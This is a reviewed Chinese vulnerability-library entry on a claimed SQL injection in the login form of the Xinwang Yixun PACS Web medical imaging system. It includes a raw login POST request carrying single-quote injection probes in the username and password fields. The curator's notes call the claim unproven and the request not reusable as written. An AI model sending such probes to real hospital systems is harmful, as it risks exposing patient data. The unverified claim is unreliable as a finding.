---
source: "wy876 漏洞文库"
title: "新网医讯PACS Web 登录TextName/TextPwd SQL注入声称"
product: "新网医讯PACS Web"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "WebForms状态字段/版本未知"
prerequisites: "登录前页面"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hifk5gfkmueb2136"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%96%B0%E7%BD%91%E5%8C%BB%E8%AE%AF/%E5%8C%97%E4%BA%AC%E6%96%B0%E7%BD%91%E5%8C%BB%E8%AE%AF%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8PACS%E7%B3%BB%E7%BB%9Fweb%E7%AB%AF%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-020b528762f151c710127e49"
entity_id: "ve-020b528762f151c710127e49"
schema_version: "1"
---

# 新网医讯PACS Web 登录TextName/TextPwd SQL注入声称

## 条目说明

- 对象与具体问题：新网医讯PACS Web；登录TextName/TextPwd SQL注入声称
- 版本、配置及部署条件：WebForms状态字段/版本未知
- 认证与权限前提：登录前页面
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两个参数仅加单引号，无报错/差异/源码，不能证明SQLi；与388万能密码可能同登录根因候选
- 固定VIEWSTATE/EVENTVALIDATION不可跨站复用，缺先GET取状态步骤
- 特征空、版本修复缺；不归成都信通网易同名PACS产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
北京新网医讯技术有限公司，公司成立于2000年3月，注册于北京中关村科技园，为国家高新技术企业和中关村高新技术企业（简称为“双高企业”），公司作为软件企业，成为北京软件和信息服务业协会会员。公司专业从事PACS(图像存储与传输系统)和RIS（放射科信息管理系统）的研究、开发工作。北京新网医讯技术有限公司PACS系统web端存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

## 二、影响版本
+ 北京新网医讯技术有限公司PACS系统web端

## 三、特征


## 四、漏洞复现
```http
POST / HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Upgrade-Insecure-Requests: 1

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=aIvFnTxaMev%2BMuIasFWPO9198V98WVrTouBNTXTfDdlwXSECHrd5D4RQ6ge5pTRoYihFHyOQ1PfpTf5vaxEjyLRsSb73HPQsKfEOglWjAGo%3D&__EVENTVALIDATION=71o1HhunkN1yKTj5EmZeDoRkcgp5eEkODmWMf4usLX6jNBDWUPDiJBL7MyjboG6J9tKBMrpLafBCb7uKUMvQf5D5fJaarcxn0qfuG00MPr%2FuQJ4dDvXykErSvcEapjM99c2NwAq2u065oiyocPT%2FS%2BV%2BfU0lhZSlV5wDem2SrRLB38wmsXsy5dcVI8zEXxxy&TextName=admin'&TextPwd=admin'&BtnLogin=%E7%99%BB%E5%BD%95
```

> 请求长度说明：原资料 Content-Length 为 448；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hifk5gfkmueb2136>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
